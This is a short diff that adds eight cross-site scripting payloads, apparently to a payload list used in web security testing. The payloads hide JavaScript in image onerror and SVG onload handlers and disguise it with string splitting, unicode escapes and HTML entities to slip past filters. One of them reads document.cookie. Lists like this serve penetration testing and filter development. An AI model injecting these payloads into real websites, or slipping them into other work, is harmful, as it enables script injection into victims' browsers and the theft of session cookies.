@@ -1,0 +1,8 @@
+<img/src/onerror="(function(x){this[x+`ert`](1)})`al`">
+<img/src/onerror="window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)">
+<img/src/onerror="document['default'+'View'][`\u0061lert`](3)">
+<img/src/onerror="this.ownerDocument.defaultView[`\u0061lert`](4)">
+<img src=x onerror=alert&#40document.domain&#41>
+<Svg Only=1 OnLoad=confirm(1)>
+"aaa<a href=javas&#99;ript:alert(1)>click"
+"><<x>img/src/onerror=alert(document.cookie)>
